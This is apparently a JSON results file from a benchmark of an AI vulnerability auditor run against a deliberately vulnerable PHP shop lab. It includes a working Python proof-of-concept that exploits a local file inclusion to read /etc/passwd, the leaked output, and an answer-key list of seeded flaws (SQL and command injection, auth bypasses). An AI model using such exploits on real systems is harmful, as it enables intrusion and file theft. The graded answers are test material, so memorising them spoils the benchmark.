+                "identity": "alice",
+                "ok": true,
+                "reason": "",
+                "status": 200,
+                "actual": {
+                  "id": 1,
+                  "username": "alice",
+                  "role": "customer",
+                  "balance": "100.00",
+                  "tier": "standard",
+                  "nickname": "alice",
+                  "homepage": "#"
+                }
+              }
+            ],
+            "reset": {},
+            "preconditions": [
+              {
+                "identity": "alice",
+                "ok": true,
+                "expected_role": "customer",
+                "actual": {
+                  "id": 1,
+                  "username": "alice",
+                  "role": "customer",
+                  "balance": "100.00",
+                  "tier": "standard",
+                  "nickname": "alice",
+                  "homepage": "#"
+                },
+                "status": 200,
+                "reason": "",
+                "expected_state": {}
+              },
+              {
+                "identity": "operator",
+                "ok": true,
+                "expected_role": "operator",
+                "actual": {
+                  "id": 3,
+                  "username": "operator",
+                  "role": "operator",
+                  "balance": "100.00",
+                  "tier": "standard",
+                  "nickname": "operator",
+                  "homepage": "#"
+                },
+                "status": 200,
+                "reason": "",
+                "expected_state": {}
+              }
+            ],
+            "state_changes": [],
+            "normal_evidence": [
+              {
+                "job_id": "147d495941874bcf9c442a3e8a521ee7",
+                "channel": "stdout",
+                "excerpt": "NORMAL_REMOTE 200 ROOT False\nNORMAL_REMOTE_SNIP '\"><label>模板地址<input name=\"template\" type=\"text\" value=\"http://fixtures:8080/templates/season.php\" required></label><button>加载模板</button></form></section><section class=\"panel\" id=\"remote-template\"><h2>合作方 · 秋日生活提案</h2><p>让生活慢下来，把好物带回家。</p></section></div><footer>拾光商城 · 会员、订单与运营协作平台 <span>版本 1.0.0</span></footer></main></div></body></html>'\nEMPTY 200 ROOT False\nATTACK 200 ROOT True BASH True\nATTACK_SNIP 'm method=\"get\"><label>模板地址<input name=\"template\" type=\"text\" value=\"/etc/passwd\" required></label><button>加载模板</button></form></section><section class=\"panel\" id=\"remote-template\">root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/'\n"
+              }
+            ],
+            "attack_evidence": [
+              {
+                "job_id": "147d495941874bcf9c442a3e8a521ee7",
+                "channel": "stdout",
+                "excerpt": "NORMAL_REMOTE 200 ROOT False\nNORMAL_REMOTE_SNIP '\"><label>模板地址<input name=\"template\" type=\"text\" value=\"http://fixtures:8080/templates/season.php\" required></label><button>加载模板</button></form></section><section class=\"panel\" id=\"remote-template\"><h2>合作方 · 秋日生活提案</h2><p>让生活慢下来，把好物带回家。</p></section></div><footer>拾光商城 · 会员、订单与运营协作平台 <span>版本 1.0.0</span></footer></main></div></body></html>'\nEMPTY 200 ROOT False\nATTACK 200 ROOT True BASH True\nATTACK_SNIP 'm method=\"get\"><label>模板地址<input name=\"template\" type=\"text\" value=\"/etc/passwd\" required></label><button>加载模板</button></form></section><section class=\"panel\" id=\"remote-template\">root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/'\n"
+              }
+            ],
+            "job_results": [
+              {
+                "job_id": "80f80ec7058b4fdf90264fda825fc1bf",
+                "kind": "script",
+                "context_id": "767394c7c493447896fb434c0adf6ebb",
+                "identity": "alice",
+                "precondition": {
+                  "ok": true,
+                  "identity": "alice",
+                  "expected_role": "customer",
+                  "actual": {
+                    "id": 1,
+                    "username": "alice",
+                    "role": "customer",
+                    "balance": "100.00",
+                    "tier": "standard",
+                    "nickname": "alice",
+                    "homepage": "#"
+                  },
+                  "status": 200,
+                  "reason": "",
+                  "expected_state": {}
+                },
+                "postcondition": {
+                  "ok": true,
+                  "identity": "alice",
+                  "expected_role": "customer",
+                  "actual": {
+                    "id": 1,
+                    "username": "alice",
+                    "role": "customer",
+                    "balance": "100.00",
+                    "tier": "standard",
+                    "nickname": "alice",
+                    "homepage": "#"
+                  },
+                  "status": 200,
+                  "reason": "",
+                  "expected_state": {}
+                },
+                "state_changes": [],
+                "request": {
+                  "target": "lab30",
+                  "language": "python",
+                  "script_sha256": "1214c790b14f4d418c3f35658eecd2b1fa4645626cfba3f46040ef4abc2eb772",
+                  "script": "import os, re, urllib.request, urllib.parse, http.cookiejar\nbase = os.environ['LAB30_URL'].rstrip('/')\njar = http.cookiejar.CookieJar()\nopener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))\nbody = opener.open(base + '/auth/login.php', timeout=10).read().decode('utf-8', 'replace')\nfields = {'username': os.environ['LAB30_USER'], 'password': os.environ['LAB30_PASSWORD']}\nm = re.search(r'name=\"csrf\" value=\"([^\"]+)\"', body)\nif m: fields['csrf'] = m.group(1)\nr = opener.open(urllib.request.Request(base + '/auth/login.php', data=urllib.parse.urlencode(fields).encode(), method='POST'), timeout=10)\nprint('login', r.status)\ndef fetch(t):\n    u = base + '/ops/template-preview.php?' + urllib.parse.urlencode({'template': t})\n    r = opener.open(u, timeout=10)\n    return r.status, r.read().decode('utf-8', 'replace')\nprint('normal', fetch('http://fixtures:8080/templates/season.php')[0])\nprint('attack', fetch('/etc/passwd'))",
+                  "timeout_seconds": 30,
+                  "artifacts": []
+                },
+                "result": {
+                  "status": "finished",
+                  "exit_code": 1,
+                  "duration_ms": 279,
+                  "stdout": "login 200\n",
+                  "stderr": "Traceback (most recent call last):\n  File \"/tmp/poc-runner/jobs/80f80ec7058b4fdf90264fda825fc1bf/poc.py\", line 15, in <module>\n    print('normal', fetch('http://fixtures:8080/templates/season.php')[0])\n                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/tmp/poc-runner/jobs/80f80ec7058b4fdf90264fda825fc1bf/poc.py\", line 13, in fetch\n    r = opener.open(u, timeout=10)\n        ^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/lib/python3.12/urllib/request.py\", line 521, in open\n    response = meth(req, response)\n               ^^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/lib/python3.12/urllib/request.py\", line 630, in http_response\n    response = self.parent.error(\n               ^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/lib/python3.12/urllib/request.py\", line 559, in error\n    return self._call_chain(*args)\n           ^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/lib/python3.12/urllib/request.py\", line 492, in _call_chain\n    result = func(*args)\n             ^^^^^^^^^^^\n  File \"/usr/local/lib/python3.12/urllib/request.py\", line 639, in http_error_default\n    raise HTTPError(req.full_url, code, msg, hdrs, fp)\nurllib.error.HTTPError: HTTP Error 403: Forbidden\n",
+                  "truncated": false,
+                  "timed_out": false
+                },
+                "exit_code": 1,
+                "duration_ms": 279,
+                "artifacts": []
+              },
+              {
+                "job_id": "147d495941874bcf9c442a3e8a521ee7",
+                "kind": "script",
+                "context_id": "767394c7c493447896fb434c0adf6ebb",
+                "identity": "operator",
+                "precondition": {
+                  "ok": true,
+                  "identity": "operator",
+                  "expected_role": "operator",
+                  "actual": {
+                    "id": 3,
+                    "username": "operator",
+                    "role": "operator",
+                    "balance": "100.00",
+                    "tier": "standard",
+                    "nickname": "operator",
+                    "homepage": "#"
+                  },
+                  "status": 200,
+                  "reason": "",
+                  "expected_state": {}
+                },
+                "postcondition": {
+                  "ok": true,
+                  "identity": "operator",
+                  "expected_role": "operator",
+                  "actual": {
+                    "id": 3,
+                    "username": "operator",
+                    "role": "operator",
+                    "balance": "100.00",
+                    "tier": "standard",
+                    "nickname": "operator",
+                    "homepage": "#"
+                  },
+                  "status": 200,
+                  "reason": "",
+                  "expected_state": {}
+                },
+                "state_changes": [],
+                "request": {
+                  "target": "lab30",
+                  "language": "python",
+                  "script_sha256": "0f47e1b2b9c0ec056903bac98b6061bdd5bb08bfce9e5f8ead4b7273bb56bb85",
+                  "script": "import os,urllib.request,urllib.parse,urllib.error,http.cookiejar\nB=os.environ['LAB30_URL'].rstrip('/')\ncj=http.cookiejar.CookieJar();o=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\no.open(B+'/auth/login.php',timeout=10).read()\no.open(B+'/auth/login.php',timeout=10,data=urllib.parse.urlencode({'username':os.environ['LAB30_USER'],'password':os.environ['LAB30_PASSWORD']}).encode()).read()\ndef fetch(t):\n u=B+'/ops/template-preview.php'+(('?'+urllib.parse.urlencode({'template':t})) if t is not None else '')\n try:\n  r=o.open(u,timeout=10);return r.status,r.read().decode('utf-8','replace')\n except urllib.error.HTTPError as e:\n  return e.code,e.read().decode('utf-8','replace')\ndef snip(b,key):\n i=b.find(key)\n return repr(b[max(0,i-180):i+220]) if i>=0 else 'NOT_FOUND'\ns,b=fetch('http://fixtures:8080/templates/season.php');print('NORMAL_REMOTE',s,'ROOT','root:x:0:0' in b);print('NORMAL_REMOTE_SNIP',snip(b,'remote-template'))\ns,b=fetch(None);print('EMPTY',s,'ROOT','root:x:0:0' in b)\ns,b=fetch('/etc/passwd');print('ATTACK',s,'ROOT','root:x:0:0' in b,'BASH','/bin/bash' in b);print('ATTACK_SNIP',snip(b,'root:x:0:0'))",
+                  "timeout_seconds": 30,
+                  "artifacts": []
+                },
+                "result": {
+                  "status": "finished",
+                  "exit_code": 0,
+                  "duration_ms": 323,
+                  "stdout": "NORMAL_REMOTE 200 ROOT False\nNORMAL_REMOTE_SNIP '\"><label>模板地址<input name=\"template\" type=\"text\" value=\"http://fixtures:8080/templates/season.php\" required></label><button>加载模板</button></form></section><section class=\"panel\" id=\"remote-template\"><h2>合作方 · 秋日生活提案</h2><p>让生活慢下来，把好物带回家。</p></section></div><footer>拾光商城 · 会员、订单与运营协作平台 <span>版本 1.0.0</span></footer></main></div></body></html>'\nEMPTY 200 ROOT False\nATTACK 200 ROOT True BASH True\nATTACK_SNIP 'm method=\"get\"><label>模板地址<input name=\"template\" type=\"text\" value=\"/etc/passwd\" required></label><button>加载模板</button></form></section><section class=\"panel\" id=\"remote-template\">root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/'\n",
+                  "stderr": "",
+                  "truncated": false,
+                  "timed_out": false
+                },
+                "exit_code": 0,
+                "duration_ms": 323,
+                "artifacts": []
+              }
+            ],
+            "summary": "确认 ops/template-preview.php 任意本地文件包含（并确认远程包含可用）。第3行把 $_GET['template'] 原样 include，无 basename、目录白名单或 realpath 前缀校验，仅 require_user(['operator','admin'])。实测 operator 会话下默认远程模板 URL 正常渲染合作方模板；而 template=/etc/passwd 在同一 #remote-template 区域回显 root:x:0:0:root:/root:/bin/bash 等系统文件内容，证明攻击者可控路径被 include，可读取任意可读本地文件。",
+            "reason": "completed",
+            "usage": {
+              "runtime": {
+                "runtime": "claude_sdk",
+                "model": "deepseek-flash",
+                "gateway": "http://127.0.0.1:8899/api/internal/poc-gateway",
+                "workspace": true,
+                "sdk_version": "0.2.174",
+                "cli_version": "2.1.310",
+                "execute_requests": 2048,
+                "max_seconds": 9772.276542908183,
+                "execute_usd": null,
+                "capability": true,
+                "generation": {
+                  "version": "sdk-generation-v1",
+                  "output_policy": "bounded-v1",
+                  "execute_output_tokens": 4096,
+                  "publish_output_tokens": 1024,
+                  "thinking": "disabled"
+                },
+                "session_policy": "session-queue-v1",
+                "time_policy": "run-budget",
+                "publication": "tool-commit",
+                "request_policy": "shared-poc-stage",
+                "cost_policy": "sdk-session-estimate-delta",
+                "max_turns": null,
+                "max_seconds_scope": "queue-remaining-window"
+              },
+              "usage": {
+                "input_tokens": 6947,
+                "output_tokens": 2506,
+                "cache_read_tokens": 420992,
+                "cache_write_tokens": null,
+                "cost_usd": 0.162106,
+                "turns": 5
+              },
+              "requests": {
+                "execute": {
+                  "limit": 2048,
+                  "used": 64,
+                  "remaining": 1984,
+                  "refused": false,
+                  "refused_at": null
+                }
+              },
+              "execute_reason": "",
+              "diagnostics": [],
+              "generation": {
+                "configured": {
+                  "version": "sdk-generation-v1",
+                  "output_policy": "bounded-v1",
+                  "execute_output_tokens": 4096,
+                  "publish_output_tokens": 1024,
+                  "thinking": "disabled"
+                },
+                "observed": {
+                  "execute": {
+                    "configured": {
+                      "max_output_tokens": 4096,
+                      "thinking": "disabled"
+                    },
+                    "requests": 64,
+                    "max_tokens": [
+                      4096
+                    ],
+                    "thinking_observed": [
+                      "absent"
+                    ]
+                  }
+                }
+              },
+              "usage_status": "final",
+              "progress": {
+                "policy": "bounded-evidence-v1",
+                "state": "published",
+                "experiments": 1,
+                "counts": {
+                  "jobs": 1,
+                  "source_reads": 0,
+                  "diagnostics_reads": 0,
+                  "evidence_reads": 1
+                },
+                "checkpoints": [],
+                "continues": [],
+                "recovery": {},
+                "stream_error": ""
+              }
+            },
+            "jobs": [
+              "147d495941874bcf9c442a3e8a521ee7"
+            ],
+            "policy": {
+              "mode": "auto",
+              "legacy": false,
+              "enabled": true,
+              "required": false,
+              "target": "lab30",
+              "job_seconds": 30,
+              "max_steps": 8,
+              "max_jobs": 8,
+              "max_seconds": 8315,
+              "browser": true,
+              "max_script_bytes": 32768,
+              "max_tokens": 4096,
+              "max_responses": 1862,
+              "reset_between_findings": true,
+              "reset_timeout": 30,
+              "runtime": "claude_sdk",
+              "sdk_requests": {
+                "version": "sdk-requests-v1",
+                "execute": 40,
+                "conclude": 3
+              },
+              "sdk_generation": {
+                "version": "sdk-generation-v1",
+                "output_policy": "bounded-v1",
+                "execute_output_tokens": 4096,
+                "publish_output_tokens": 1024,
+                "thinking": "disabled"
+              },
+              "session_policy": "session-queue-v1",
+              "item_warning_seconds": 300,
+              "progress_policy": "bounded-evidence-v1",
+              "progress_params": {
+                "version": "bounded-evidence-v1",
+                "initial_bytes": 24576,
+                "initial_files": 4,
+                "context_lines": 20,
+                "read_lines": 200,
+                "read_bytes": 16384,
+                "read_calls": 12,
+                "checkpoint_experiments": 2,
+                "continues": 2,
+                "item_warning_seconds": 600,
+                "recovery_seconds": 60,
+                "recovery_requests": 3,
+                "cleanup_seconds": 10
+              }
+            },
+            "source": {
+              "policy": "bounded-evidence-v1",
+              "available": true,
+              "reason": "",
+              "snapshot_id": "586b79b41f8e4f59be80f2a9b548902b",
+              "archive_version": "1.0.0",
+              "target_version": "lab30-shop-1.0.0",
+              "applicability": "match",
+              "initial_bytes": 5203,
+              "initial_files": 2,
+              "read_calls": 0,
+              "read_budget": 12,
+              "bytes_read": 0,
+              "reads": [],
+              "reads_omitted": 0
+            },
+            "target_key": "0f6146dec81c894fc3281d4308f49bc94227c9e0dbb1963a377d84edff6fc19a",
+            "source_content_key": "52ff99c0256df8095adcbf7636257f649d62c72fdd2966e2e3ea8a694346e7f7",
+            "run_finding_revision": 1
+          },
+          "target": {
+            "name": "lab30",
+            "base_url": "http://lab30",
+            "user": "alice",
+            "security": "",
+            "version": "lab30-shop-1.0.0",
+            "prepared_at": "2026-10-30T14:31:31Z"
+          },
+          "artifacts": [],
+          "project_finding_id": "84652dd95a814ae4b7d93fcd84a65de5",
+          "finding_revision": 10
+        }
+      ],
+      "verification_reviews": [
+        {
+          "id": "98ac40a54198459db4306fd770962c8d",
+          "verification_id": "8495a233fb2f4e0f8107473a455c9469",
+          "run_id": "2969bcf204cd43b5baf2683cbb0e841d",
+          "plan_id": "bb6e3df080a34e3ab9cea2646a181bf0",
+          "finding_id": "755caa0a9ce04369bac0bc106f3406d2",
+          "revision": 1,
+          "decision": "confirmed",
+          "rationale": "两侧观测完整对照：normal 侧 operator 加载默认 template=http://fixtures:8080/templates/season.php 时 #remote-template 渲染合作方模板内容且 ROOT False；attack 侧同一会话 template=/etc/passwd 返回 200 且 <section id=\"remote-template\"> 内原文回显 'root:x:0:0:root:/root:/bin/bash'（ROOT True、BASH True），与源码 template-preview.php:3 include $template 一致，任意本地文件包含成立，远程包含同时可用。",
+          "observed_normal": "正常侧：operator 会话下 GET /ops/template-preview.php?template=http://fixtures:8080/templates/season.php 返回 NORMAL_REMOTE 200，<section id=\"remote-template\"> 渲染远程模板内容“合作方 · 秋日生活提案 / 让生活慢下来，把好物带回家。”，不含 /etc/passwd 内容（ROOT False）；不传 template 时返回 EMPTY 200 且无 include 内容。",
+          "observed_attack": "攻击侧 GET /ops/template-preview.php?template=/etc/passwd 返回 200，页面 <section id=\"remote-template\"> 内原文回显 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:...'（ROOT True、BASH True），即 GET 参数被直接 include 为本地绝对路径，泄露任意可读文件内容。",
+          "created_at": "2026-10-30T14:43:21.031010+00:00"
+        }
+      ],
+      "file_path": "lab30-shop/app/public/ops/template-preview.php",
+      "symbol": "<project>",
+      "unit_start_line": 1,
+      "unit_end_line": 4,
+      "task_id": "b08ad4f2b4974e2eaf2faa0e183c562b",
+      "task_key": "ops-template-eval",
+      "line": 1
+    }
+  ],
+  "diagnostics": [
+    {
+      "finding_id": "755caa0a9ce04369bac0bc106f3406d2",
+      "reason": "type_mismatch",
+      "vulnerability_type": "lfi",
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/template-preview.php",
+        "line": 3
+      },
+      "location_truth_ids": [
+        "06"
+      ],
+      "expected_types": [
+        "rfi"
+      ]
+    }
+  ],
+  "missed_diagnostics": [
+    {
+      "truth_id": "07",
+      "reason": "no_related_candidate",
+      "related_candidates": [],
+      "affects_score": false
+    },
+    {
+      "truth_id": "09",
+      "reason": "no_related_candidate",
+      "related_candidates": [],
+      "affects_score": false
+    },
+    {
+      "truth_id": "10",
+      "reason": "no_related_candidate",
+      "related_candidates": [],
+      "affects_score": false
+    },
+    {
+      "truth_id": "14",
+      "reason": "no_related_candidate",
+      "related_candidates": [],
+      "affects_score": false
+    },
+    {
+      "truth_id": "17",
+      "reason": "no_related_candidate",
+      "related_candidates": [],
+      "affects_score": false
+    },
+    {
+      "truth_id": "18",
+      "reason": "no_related_candidate",
+      "related_candidates": [],
+      "affects_score": false
+    },
+    {
+      "truth_id": "23",
+      "reason": "no_related_candidate",
+      "related_candidates": [],
+      "affects_score": false
+    },
+    {
+      "truth_id": "24",
+      "reason": "evidence_anchor_primary_mismatch",
+      "related_candidates": [
+        {
+          "finding_id": "7d557370dabe4a41ba0c681deb30a0a1",
+          "reason": "evidence_anchor_primary_mismatch",
+          "primary_location": {
+            "path": "lab30-shop/app/public/ops/ping.php",
+            "line": 2
+          },
+          "vulnerability_type": "command_injection"
+        }
+      ],
+      "affects_score": false
+    }
+  ],
+  "duplicate_statistics": {
+    "still_asserted": 0,
+    "resolved": 0
+  },
+  "excluded_invalid": [],
+  "false_positives": [
+    "运营远程模板预览将 GET template 直接 include 造成任意本地文件包含"
+  ],
+  "missed": [
+    "07 运营公式动态函数调用代码执行",
+    "09 数据库诊断异常与堆栈信息泄露",
+    "10 使用 MD5 存储密码",
+    "14 邮箱设置跨站请求伪造",
+    "17 人员管理信任客户端角色 Cookie 权限绕过",
+    "18 维护接口信任请求头认证绕过",
+    "23 会员查询跨文件 SQL 注入",
+    "24 主机巡检跨文件命令注入"
+  ],
+  "missed_details": [
+    {
+      "id": "07",
+      "truth_id": "07",
+      "title": "运营公式动态函数调用代码执行",
+      "class": "code_execution",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/formula.php",
+          "line": 3,
+          "line_sha256": "b19cc75cb9b92d69d482f8fe626389c836cb73d63bc563cdcb374148ac192812",
+          "rationale": "用户选择函数名并控制调用参数，缺少允许函数清单。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/formula.php",
+          "line": 3
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "09",
+      "truth_id": "09",
+      "title": "数据库诊断异常与堆栈信息泄露",
+      "class": "info_disclosure",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/database.php",
+          "line": 3,
+          "line_sha256": "e78884061f4c4b81c82941cb05fa6ad4522f0f1565fdec2bdffeae193a6e0fce",
+          "rationale": "异常类型、消息和完整堆栈直接拼入页面输出。"
+        },
+        {
+          "path": "app/public/ops/database.php",
+          "line": 4,
+          "line_sha256": "0a928e56e8e51b9557dc4c79294611f7c293246f1d7a42b73e79a56fc1617cc6",
+          "rationale": "页面输出未经隐藏处理的诊断异常消息和堆栈；HTML 转义不消除信息泄露。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/database.php",
+          "line": 3
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "10",
+      "truth_id": "10",
+      "title": "使用 MD5 存储密码",
+      "class": "weak_crypto",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/public/auth/register.php",
+          "line": 8,
+          "line_sha256": "a231629824f2b856423cfaf35a47e1af2b791b88241ac2d32ea979a3a4099923",
+          "rationale": "注册密码以无盐快速 MD5 形式写入 password_md5。"
+        },
+        {
+          "path": "app/src/setup.php",
+          "line": 17,
+          "line_sha256": "e23345e7042ee9c9cee6290475dcebee0cac02f9d3a2852c2cd5ae8390045b8a",
+          "rationale": "初始化用户密码以无盐 MD5 形式写入用户表。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/auth/register.php",
+          "line": 8
+        },
+        {
+          "path": "app/src/setup.php",
+          "line": 17
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "14",
+      "truth_id": "14",
+      "title": "邮箱设置跨站请求伪造",
+      "class": "csrf",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/public/account/settings.php",
+          "line": 5,
+          "line_sha256": "53f409fd8b888dc72278f1bb483f4bb3a0097af02379243396b9bc2092248f29",
+          "rationale": "已认证用户邮箱更新操作缺失 CSRF 令牌检查。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/account/settings.php",
+          "line": 5
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "17",
+      "truth_id": "17",
+      "title": "人员管理信任客户端角色 Cookie 权限绕过",
+      "class": "auth_bypass",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/users.php",
+          "line": 2,
+          "line_sha256": "2c144459341e60bd6a9a03ae60ef87881d140dd3d089e584f9fcf546229f4e36",
+          "rationale": "客户端 role Cookie 覆盖真实用户角色并决定管理员授权。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/users.php",
+          "line": 2
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "18",
+      "truth_id": "18",
+      "title": "维护接口信任请求头认证绕过",
+      "class": "auth_bypass",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/maintenance.php",
+          "line": 3,
+          "line_sha256": "3df8df57413258463abaea08fa6fcce33fe128751d9848cf7962a2cc0a8f18d3",
+          "rationale": "仅依赖客户端 X-Admin 请求头决定维护服务授权。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/maintenance.php",
+          "line": 3
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "23",
+      "truth_id": "23",
+      "title": "会员查询跨文件 SQL 注入",
+      "class": "sqli",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/src/member_lookup.php",
+          "line": 3,
+          "line_sha256": "a7d93b540dbfb5dc4ad5ae70d79c16c1cf24201f488f728a5b9481a365451c1b",
+          "rationale": "跨文件传入的检索词在公共函数中拼接 SQL 并 query。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/members.php",
+          "line": 2
+        },
+        {
+          "path": "app/src/member_lookup.php",
+          "line": 3
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "24",
+      "truth_id": "24",
+      "title": "主机巡检跨文件命令注入",
+      "class": "command_injection",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/src/host_check.php",
+          "line": 2,
+          "line_sha256": "fa0699fdd4a540a46ac8bd99e7eea2771d121362ac5dfc6b561d4625372954fa",
+          "rationale": "公共巡检函数将调用方 host 直接拼入 shell_exec。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/batch-check.php",
+          "line": 2
+        },
+        {
+          "path": "app/src/host_check.php",
+          "line": 2
+        }
+      ],
+      "primary_location": null
+    }
+  ],
+  "class_coverage": {
+    "sqli": {
+      "total": 3,
+      "detected": 2,
+      "missed": 1,
+      "detected_ids": [
+        "01",
+        "28"
+      ],
+      "missed_ids": [
+        "23"
+      ]
+    },
+    "xss_r": {
+      "total": 2,
+      "detected": 2,
+      "missed": 0,
+      "detected_ids": [
+        "02",
+        "25"
+      ],
+      "missed_ids": []
+    },
+    "command_injection": {
+      "total": 2,
+      "detected": 1,
+      "missed": 1,
+      "detected_ids": [
+        "03"
+      ],
+      "missed_ids": [
+        "24"
+      ]
+    },
+    "path_traversal": {
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detected_ids": [
+        "04"
+      ],
+      "missed_ids": []
+    },
+    "lfi": {
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detected_ids": [
+        "05"
+      ],
+      "missed_ids": []
+    },
+    "rfi": {
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detected_ids": [
+        "06"
+      ],
+      "missed_ids": []
+    },
+    "code_execution": {
+      "total": 2,
+      "detected": 1,
+      "missed": 1,
+      "detected_ids": [
+        "29"
+      ],
+      "missed_ids": [
+        "07"
+      ]
+    },
+    "open_redirect": {
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detected_ids": [
+        "08"
+      ],
+      "missed_ids": []
+    },
+    "info_disclosure": {
+      "total": 1,
+      "detected": 0,
+      "missed": 1,
+      "detected_ids": [],
+      "missed_ids": [
+        "09"
+      ]
+    },
+    "weak_crypto": {
+      "total": 1,
+      "detected": 0,
+      "missed": 1,
+      "detected_ids": [],
+      "missed_ids": [
+        "10"
+      ]
+    },
+    "xss_s": {
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detected_ids": [
+        "11"
+      ],
+      "missed_ids": []
+    },
+    "ssrf": {
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detected_ids": [
+        "12"
+      ],
+      "missed_ids": []
+    },
+    "xxe": {
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detected_ids": [
+        "13"
+      ],
+      "missed_ids": []
+    },
+    "csrf": {
+      "total": 1,
+      "detected": 0,
+      "missed": 1,
+      "detected_ids": [],
+      "missed_ids": [
+        "14"
+      ]
+    },
+    "insecure_deserialization": {
+      "total": 2,
+      "detected": 2,
+      "missed": 0,
+      "detected_ids": [
+        "15",
+        "27"
+      ],
+      "missed_ids": []
+    },
+    "idor": {
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detected_ids": [
+        "16"
+      ],
+      "missed_ids": []
+    },
+    "auth_bypass": {
+      "total": 3,
+      "detected": 1,
+      "missed": 2,
+      "detected_ids": [
+        "26"
+      ],
+      "missed_ids": [
+        "17",
+        "18"
+      ]
+    },
+    "price_manipulation": {
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detected_ids": [
+        "19"
+      ],
+      "missed_ids": []
+    },
+    "race_condition": {
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detected_ids": [
+        "20"
+      ],
+      "missed_ids": []
+    },
+    "session_fixation": {
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detected_ids": [
+        "21"
+      ],
+      "missed_ids": []
+    },
+    "weak_type_comparison": {
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detected_ids": [
+        "22"
+      ],
+      "missed_ids": []
+    },
+    "mass_assignment": {
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detected_ids": [
+        "30"
+      ],
+      "missed_ids": []
+    }
+  },
+  "severity_evaluation": {
+    "checked": true,
+    "compared": 22,
+    "correct": 15,
+    "accuracy": 0.6818181818181818
+  },
+  "cvss_evaluation": {
+    "checked": true,
+    "compared": 19,
+    "scoring_coverage": 0.8636363636363636,
+    "missing_truth": 0,
+    "missing_reported": 3,
+    "invalid_reported": 0,
+    "score_mae": 1.0263157894736843,
+    "score_accuracy": 0.3684210526315789,
+    "vector_compared": 19,
+    "vector_accuracy": 0.3684210526315789
+  },
+  "truth_provenance": {
+    "repository": "https://github.com/Luchutong/llm-vuln-audit",
+    "ref": "feat/lab30-shop",
+    "commit": "30364ecd8f1c7c8c10e3f2e66107dfc38ecd1434",
+    "path": "answers/answers.json",
+    "answers_sha256": "839decac147362e43166fc4da742b9af2ea4c5c9f38ca8f8f2be45c9496c20ff",
+    "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+    "specification": "https://www.first.org/cvss/v3.1/specification-document"
+  }
+}
